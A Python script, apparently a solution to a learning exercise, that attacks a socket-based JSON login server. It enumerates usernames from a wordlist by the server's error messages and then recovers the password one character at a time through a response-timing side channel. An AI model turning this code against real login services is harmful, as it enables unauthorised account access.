# write your code here
import sys
import json
import datetime
import socket
import string


sys_args = sys.argv

hostname = sys_args[1]
port = int(sys_args[2])

passwords_db = r"C:\Users\User\PycharmProjects\Password Hacker1\Password Hacker\task\hacking\passwords.txt"
login_db = r"C:\Users\User\PycharmProjects\Password Hacker1\Password Hacker\task\hacking\logins.txt"


def brute_login_generator():
    """Brute login"""
    with open(login_db, 'r') as f:
        for line in f:
            line = line.strip('\n')
            yield line


def brute_password_generator():
    """Brute password"""
    valid_char = string.ascii_letters + string.digits

    while True:
        for char in valid_char:
            yield char


def main():
    with socket.socket() as client_socket:
        address = hostname, port
        client_socket.connect(address)

        correct_login = None
        """If Login is correct server will
         return message 'Wrong password!'"""
        for login in brute_login_generator():
            login_data = {"login": login, "password": ' '}
            data_json = json.dumps(login_data)
            message = data_json.encode()

            client_socket.send(message)

            response_json = client_socket.recv(1024).decode()
            response = json.loads(response_json)

            if response['result'] == "Wrong password!":
                correct_login = login
                break

        """Brute password letter by letter"""
        if correct_login is not None:
            password = ""

            for ch in brute_password_generator():
                correct_password = password + ch
                correct_data = {"login": correct_login, "password": correct_password}
                correct_data_json = json.dumps(correct_data)
                message = correct_data_json.encode()

                start = datetime.datetime.now()
                client_socket.send(message)

                response_json = client_socket.recv(1024).decode()
                response = json.loads(response_json)
                end = datetime.datetime.now()
                if (end - start).microseconds >= 90000:
                    password += ch
                if response['result'] == "Connection success!":
                    print(correct_data_json)
                    break


if __name__ == '__main__':
    main()
